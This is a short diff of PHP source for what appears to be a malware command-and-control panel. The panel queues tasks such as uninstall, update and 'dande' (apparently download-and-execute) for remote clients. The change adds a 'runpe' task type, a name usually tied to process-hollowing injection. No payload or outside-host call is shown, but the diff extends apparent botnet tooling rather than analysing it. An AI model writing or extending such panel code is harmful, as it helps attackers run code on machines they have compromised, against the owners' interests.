@@ -194,7 +194,7 @@ class Main{
                 if($_POST["task"] == "uninstall") {
                     $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                     $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"]));
-                } elseif($_POST["task"] == "dande" || $_POST["task"] == "update") {
+                } elseif($_POST["task"] == "dande" || $_POST["task"] == "update" || $_POST["task"] == "runpe") {
                     if(empty($_POST["command"])){
                         die("Please Input a Command");
                     }
